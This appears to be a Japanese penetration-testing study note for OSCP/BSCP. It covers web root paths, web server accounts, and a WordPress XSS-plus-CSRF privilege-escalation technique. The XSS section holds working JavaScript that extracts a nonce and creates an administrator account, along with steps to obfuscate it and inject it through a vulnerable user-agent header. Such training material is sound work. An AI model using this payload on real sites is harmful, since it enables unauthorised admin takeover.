# 基本情報

## Webアプリのディレクトリ

- LinuxシステムのApache Webアプリでは`/var/www/html`がWebのrootディレクトリとして使われることが多い
	- → つまり、例えば、http://example.com/file.txtと入力すると、`/var/www/html/file.txt`にアクセスできるということ
- WindowsシステムのIIS Webアプリでは、`C:\inetpub\wwwroot`
- このディレクトリに書き込み可能なら、Webshell獲得できるかも（[Bind & Reverse Shell・ペイロード・安定化手法](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#注意＆Tips)）

---

## Webアプリのユーザー

- セキュリティ上、Webのユーザーは権限が低く設定されていることが多い
	- （高権限をもつこともある）

- Debian, Nginxなどは`www-data`
- Apacheは`apache`
- WindowsのWebサーバー`IIS`においては、以下2つがアカウント
	- Network Service（旧）
	- IIS Application Pool Identity（新）（※）
		- (※：Application Pool＝Webアプリを独立して管理する仕組みで、安定性・セキュリティ向上に役立つ)
		- 例：`IIS APPPOOL\DefaultAppPool` のような形式で、ACLを使ってアプリごとに適切な権限が付与される
		
---

## Tips

- リクエスト・レスポンスの中身はBurp Suiteもしくはcurlコマンドで閲覧すること
- （ブラウザ上で閲覧すると、レンダリングの際に自動で情報が抜け落ちることがある）

---
---

# 攻撃手法


---

## API Test

- 基本はBSCPのAPI testingノートを参照→[🔍API testing](🔍API%20testing.md)
- API endpointの探索は、[👻Gobuster](../../Tools/👻Gobuster.md#Summery%20Gobuster)を参照

---

## XSS

- 基本はBSCP valutのXSSノートを参照→[🔍XSS](../../../BSCP/Client-side/XSS/🔍XSS.md)

### 具体例：Privilege Escalation w/XSS & CSRF

(cookieを窃取して実行する方法はBSCPノートを閲覧)

- 目的：高権限のユーザーを作成

- 攻撃のシチュエーション：
	- CookieにHTTP onlyフラグが付与されていて、JavaScriptでは窃取できないとき
	- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき

- 参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)

#### 手順

1. ソースコードもしくはFuzzingでXSSに脆弱なHTTPヘッダーなどを洗い出す（BSCPノートを参照）
	（今回はVisitorsプラグインの`user-agent`が脆弱であるとする）

2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャしておく

3. nonceの値を抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成（コメントは削除して使用）

nonce抽出
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
- 3行目にアクション実行先のHTTPリクエスト
- 4行目第三引数をfalseとすることで、同期通信になる。nonceを確実に抽出する目的

抽出したnonceを使用してアクションを実行するリクエストを作成する
```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
- 1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している

4. [Web攻撃の難読化](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。

5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）

![](../../Images/Pasted%20image%2020250321200240.png)

6. ステップ1に記載の通り、Visitorsプラグインを閲覧し、user-agentが何も記載されていないことを確認できれば成功

![](../../Images/Pasted%20image%2020250320123601.png)

![](../../Images/Pasted%20image%2020250320123617.png)

---

## Path traversal

- BSCP valutのPath traversalノートを参照→[🔍Path traversal](🔍Path%20traversal.md)

---


---
---

# Misc

## 開発者ツール

- BSCPノートを参照→[ブラウザ開発者ツール](ブラウザ開発者ツール.md)
